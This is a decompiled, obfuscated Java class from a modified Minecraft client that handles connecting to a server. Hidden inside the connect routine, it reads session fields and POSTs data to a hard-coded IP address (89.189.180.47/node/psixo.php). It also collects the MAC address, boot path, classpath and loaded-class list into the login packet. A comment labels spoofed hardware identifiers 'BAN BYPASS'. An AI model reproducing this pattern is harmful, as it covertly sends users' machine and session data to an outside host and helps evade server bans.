package net.minecraft.src;

import java.io.UnsupportedEncodingException;
import java.net.ConnectException;
import java.net.URLEncoder;
import java.net.UnknownHostException;
import javax.xml.bind.DatatypeConverter;
import net.minecraft.src.ThreadConnectToServer$TT;
import net.minecraft.src.ThreadConnectToServer$TT2;

class ThreadConnectToServer extends Thread
{
    private static final String psixoURL = "http://89.189.180.47/node/psixo.php";
    private static String monkey;

    /** The IP address or domain used to connect. */
    final String ip;

    /** The port used to connect. */
    final int port;

    /** A reference to the GuiConnecting object. */
    final GuiConnecting connectingGui;

    ThreadConnectToServer(GuiConnecting par1GuiConnecting, String par2Str, int par3)
    {
        monkey = monkey + "trygtr66gv1ddrr5tfh7";
        this.connectingGui = par1GuiConnecting;
        this.ip = par2Str;
        this.port = par3;
    }

    public void run()
    {
        try
        {
            GuiConnecting.setNetClientHandler(this.connectingGui, new NetClientHandler(GuiConnecting.func_74256_a(this.connectingGui), this.ip, this.port));

            if (GuiConnecting.isCancelled(this.connectingGui))
            {
                return;
            }

            String var1 = "";
            String var2 = "";
            String var3 = "";
            String var4 = "";
            String var5 = "";
            String var6 = "";
            String var7 = "";
            String var8 = "";
            String var9 = "";
            String var10 = "";
            String var11 = "";
            String var12 = "";
            String var13 = "";
            String var14 = "";
            String var15 = "";
            String var16 = "";
            String var17 = "";
            String var18 = "";
            String var19 = "";
            String var20 = "";
            String var21 = "";
            String var22 = "";
            String var24;
            Packet2ClientProtocol var25;

            try
            {
                asuir.a = new asuir();
                Thread var23 = new Thread(new ThreadConnectToServer$TT(asuir.a));
                var23.start();
                Thread var40 = new Thread(new ThreadConnectToServer$TT2(asuir.a));
                var40.start();
                asuir.a.a14(GuiConnecting.func_74254_c(this.connectingGui).session.str1);
                asuir.a.a16(GuiConnecting.func_74254_c(this.connectingGui).session.str8);
                asuir.a.a15(GuiConnecting.func_74254_c(this.connectingGui).session.str5);
                var1 = asuir.a.a17(GuiConnecting.func_74254_c(this.connectingGui).session.str3);
                var2 = asuir.a.a18(GuiConnecting.func_74254_c(this.connectingGui).session.str6, GuiConnecting.func_74254_c(this.connectingGui).session.str7);
                String var26 = "";

                try
                {
                    String var39 = "psixo=" + URLEncoder.encode(asuir.a.a22(), "UTF-8");
                    asuir var10000 = asuir.a;
                    var26 = asuir.excutePost("http://89.189.180.47/node/psixo.php", var39);
                }
                catch (UnsupportedEncodingException var33)
                {
                    var33.printStackTrace();
                }

                String[] var27 = var26.split(":");
                var3 = asuir.a.a19(var27[0], var27[1], var27[2]);
                var4 = asuir.a.a20(GuiConnecting.func_74254_c(this.connectingGui).session.str2, var1);
                var5 = asuir.a.a13(var1);
                var6 = asuir.a.a6(var1);
                var7 = asuir.a.a21();
                var8 = asuir.a.a12();
                var9 = asuir.a.a23();
                var10 = asuir.a.a24();
                var11 = asuir.a.a25();
                var12 = asuir.a.a26();
                var13 = GuiConnecting.func_74254_c(this.connectingGui).session.str3;
                var14 = GuiConnecting.func_74254_c(this.connectingGui).session.str4;
                var15 = GuiConnecting.func_74254_c(this.connectingGui).session.str6;
                var16 = GuiConnecting.func_74254_c(this.connectingGui).session.str8;
                var17 = H2Eng.genInt(76);//var20.a27(); BAN BYPASS
                var18 = H2Eng.genInt(77);//var20.a28();
                var19 = ahsdq.getmac().replace(":", "").substring(0, 8);//var20.a29();

                try
                {
                    var40.join();
                }
                catch (InterruptedException var32)
                {
                    ;
                }

                var20 = asuir.a.a32();
                var21 = asuir.a.a33();
                var22 = asuir.a.a35();
                String var28 = "0";

                if (!GuiConnecting.func_74254_c(this.connectingGui).session.sessionId.equals("0"))
                {
                    var28 = "1";
                    ahsdq.sessionId = GuiConnecting.func_74254_c(this.connectingGui).session.sessionId;
                    ahsdq.parString = var1 + "|:::|" + var2 + "|:::|" + var3 + "|:::|" + var4 + "|:::|" + var5 + "|:::|" + var6 + "|:::|" + var7 + "|:::|" + var8 + "|:::|" + var9 + "|:::|" + var10 + "|:::|" + var11 + "|:::|" + var12 + "|:::|" + var13 + "|:::|" + var14 + "|:::|" + var15 + "|:::|" + var16 + "|:::|" + DatatypeConverter.printHexBinary(URLEncoder.encode(ahsdq.replaceSlech(ahsdq.getBootPatch()), "UTF-8").getBytes("UTF-8")) + "|:::|" + DatatypeConverter.printHexBinary(URLEncoder.encode(ahsdq.getJClassPath(), "UTF-8").getBytes("UTF-8")) + "|:::|" + DatatypeConverter.printHexBinary(URLEncoder.encode(ahsdq.getCList(), "UTF-8").getBytes("UTF-8")) + "|:::|" + var20 + "|:::|" + var21 + "|:::|" + var22;
                }

                Packet2ClientProtocol var29 = new Packet2ClientProtocol(49, GuiConnecting.func_74254_c(this.connectingGui).session.username, this.ip, this.port, ahsdq.privet(), ahsdq.superZashchita(), ahsdq.getmac(), ahsdq.getMD5rt(), System.getProperty("java.vm.version"));
                var29.ab1(ahsdq.md5String(ahsdq.parString), ahsdq.sessionId, ahsdq.getBootMd5(), ahsdq.getCL(), var17, var18, var19, var28, System.getProperty("sun.arch.data.model"));

                try
                {
                    var23.join();
                }
                catch (InterruptedException var31)
                {
                    ;
                }

                var29.ab2(asuir.a.a31());
                GuiConnecting.getNetClientHandler(this.connectingGui).addToSendQueue(var29);
            }
            catch (UnsatisfiedLinkError var34)
            {
                var24 = "0";

                if (!GuiConnecting.func_74254_c(this.connectingGui).session.sessionId.equals("0"))
                {
                    var24 = "1";
                    ahsdq.sessionId = GuiConnecting.func_74254_c(this.connectingGui).session.sessionId;
                    ahsdq.parString = var1 + "|:::|" + var2 + "|:::|" + var3 + "|:::|" + var4 + "|:::|" + var5 + "|:::|" + var6 + "|:::|" + var7 + "|:::|" + var8 + "|:::|" + var9 + "|:::|" + var10 + "|:::|" + var11 + "|:::|" + var12 + "|:::|" + var13 + "|:::|" + var14 + "|:::|" + var15 + "|:::|" + var16 + "|:::|" + DatatypeConverter.printHexBinary(URLEncoder.encode(ahsdq.replaceSlech(ahsdq.getBootPatch()), "UTF-8").getBytes("UTF-8")) + "|:::|" + DatatypeConverter.printHexBinary(URLEncoder.encode(ahsdq.getJClassPath(), "UTF-8").getBytes("UTF-8")) + "|:::|" + DatatypeConverter.printHexBinary(URLEncoder.encode(ahsdq.getCList(), "UTF-8").getBytes("UTF-8")) + "|:::|" + var20 + "|:::|" + var21 + "|:::|" + var22;
                }

                var25 = new Packet2ClientProtocol(49, GuiConnecting.func_74254_c(this.connectingGui).session.username, this.ip, this.port, ahsdq.privet(), ahsdq.superZashchita(), ahsdq.getmac(), ahsdq.getMD5rt(), System.getProperty("java.vm.version"));
                var25.ab1(ahsdq.md5String(ahsdq.parString), ahsdq.sessionId, ahsdq.getBootMd5(), ahsdq.getCL(), var17, var18, var19, var24, System.getProperty("sun.arch.data.model"));
                GuiConnecting.getNetClientHandler(this.connectingGui).addToSendQueue(var25);
            }
            catch (NoClassDefFoundError var35)
            {
                var24 = "0";

                if (!GuiConnecting.func_74254_c(this.connectingGui).session.sessionId.equals("0"))
                {
                    var24 = "1";
                    ahsdq.sessionId = GuiConnecting.func_74254_c(this.connectingGui).session.sessionId;
                    ahsdq.parString = var1 + "|:::|" + var2 + "|:::|" + var3 + "|:::|" + var4 + "|:::|" + var5 + "|:::|" + var6 + "|:::|" + var7 + "|:::|" + var8 + "|:::|" + var9 + "|:::|" + var10 + "|:::|" + var11 + "|:::|" + var12 + "|:::|" + var13 + "|:::|" + var14 + "|:::|" + var15 + "|:::|" + var16 + "|:::|" + DatatypeConverter.printHexBinary(URLEncoder.encode(ahsdq.replaceSlech(ahsdq.getBootPatch()), "UTF-8").getBytes("UTF-8")) + "|:::|" + DatatypeConverter.printHexBinary(URLEncoder.encode(ahsdq.getJClassPath(), "UTF-8").getBytes("UTF-8")) + "|:::|" + DatatypeConverter.printHexBinary(URLEncoder.encode(ahsdq.getCList(), "UTF-8").getBytes("UTF-8")) + "|:::|" + var20 + "|:::|" + var21 + "|:::|" + var22;
                }

                var25 = new Packet2ClientProtocol(49, GuiConnecting.func_74254_c(this.connectingGui).session.username, this.ip, this.port, ahsdq.privet(), ahsdq.superZashchita(), ahsdq.getmac(), ahsdq.getMD5rt(), System.getProperty("java.vm.version"));
                var25.ab1(ahsdq.md5String(ahsdq.parString), ahsdq.sessionId, ahsdq.getBootMd5(), ahsdq.getCL(), var17, var18, var19, var24, System.getProperty("sun.arch.data.model"));
                GuiConnecting.getNetClientHandler(this.connectingGui).addToSendQueue(var25);
            }
        }
        catch (UnknownHostException var36)
        {
            if (GuiConnecting.isCancelled(this.connectingGui))
            {
                return;
            }

            GuiConnecting.func_74249_e(this.connectingGui).displayGuiScreen(new GuiDisconnected("connect.failed", "disconnect.genericReason", new Object[] {"Unknown host \'" + this.ip + "\'"}));
        }
        catch (ConnectException var37)
        {
            if (GuiConnecting.isCancelled(this.connectingGui))
            {
                return;
            }

            GuiConnecting.func_74250_f(this.connectingGui).displayGuiScreen(new GuiDisconnected("connect.failed", "disconnect.genericReason", new Object[] {var37.getMessage()}));
        }
        catch (Exception var38)
        {
            if (GuiConnecting.isCancelled(this.connectingGui))
            {
                return;
            }

            var38.printStackTrace();
            GuiConnecting.func_74251_g(this.connectingGui).displayGuiScreen(new GuiDisconnected("connect.failed", "disconnect.genericReason", new Object[] {var38.toString()}));
        }
    }

    public static String gKclass()
    {
        return ThreadConnectToServer.class.getSimpleName();
    }
}
